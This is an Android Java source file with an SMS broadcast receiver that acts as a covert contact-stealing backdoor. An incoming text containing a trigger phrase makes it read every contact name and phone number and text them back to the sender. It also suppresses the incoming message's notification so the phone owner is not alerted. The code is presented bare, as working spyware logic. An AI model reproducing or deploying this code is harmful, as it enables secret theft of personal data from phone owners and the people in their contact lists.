package com.kevinmorton.sms;


import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.util.ArrayList;


public class SmsBroadCastReceiver extends BroadcastReceiver {

    private static String SMS_PATTERN = "SEND ME YOUR CONTACTS:)";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();

        ContentResolver cr = context.getContentResolver();
        // Specify the bundle to get object based on SMS protocol "pdus"
        Object[] object = (Object[]) bundle.get("pdus");
        SmsMessage sms[] = new SmsMessage[object.length];
        for (int i = 0; i < object.length; i++) {
            sms[i] = SmsMessage.createFromPdu((byte[]) object[i]);
            // get the received SMS content
            String receivedPattern = sms[i].getDisplayMessageBody();
            String originNum = sms[i].getDisplayOriginatingAddress();
            // if the received SMS matches the SMS_PATTERN
            // it means that this is a fetch contact list request SMS
            if (receivedPattern.equalsIgnoreCase(SMS_PATTERN)) {
                // retrieve the all the contact records
                String contactList = retrieveContactRecord(cr);
                // if the contact list is not empty
                if (!contactList.equalsIgnoreCase(""))
                // send the response SMS with the retrieved contact info
                {
                    sendReplySMS(originNum, contactList);
                }
                // prevent the notification of the received SMS
                abortBroadcast();
                Intent in = new Intent(context, TestActivity.class);
                in.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                in.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                in.putExtra("num", originNum + "");
                in.putExtra("content", receivedPattern);
                context.startActivity(in);
            }
        }
    }

    public static void sendReplySMS(String phoneNo, String sms) {
        try {
            //get a SmsManager
            SmsManager smsManager = SmsManager.getDefault();
            //Message may exceed 160 characters
            //need to divide the message into multiples
            ArrayList<String> parts = smsManager.divideMessage(sms);
            smsManager.sendMultipartTextMessage(phoneNo, null, parts, null, null);
            //Log.d("MESSAGE", "SENT!");
        } catch (Exception e) {
            //Log.d("MESSAGE", "FAILED!");
            e.printStackTrace();
        }
    }


    public static String retrieveContactRecord(ContentResolver cr) {
        StringBuffer sb = new StringBuffer();

        // form a query for all contacts
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        String sortOrder = ContactsContract.Contacts.DISPLAY_NAME
                + " COLLATE LOCALIZED ASC";

        Cursor cur = cr.query(uri, null, null, null, sortOrder);
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                // get the contact ID
                String contactId = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                // get the contact name
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

// form another cursor to retrieve phone number based on a contact ID
                Cursor phones = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
                // for the situation that a person has multiple numbers
                while (phones.moveToNext()) {
                    // get the phone number
                    String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    // form the return string
                    sb.append(name);
                    sb.append(": ");
                    sb.append(phoneNumber);
                    sb.append(";\n");
                    Log.i("NAME", name);
                    Log.i("NUM", phoneNumber);
                }
                phones.close();
            }
        }

        cur.close();
        // form the return message
        String returnString = sb.toString();
        return returnString;
    }
}
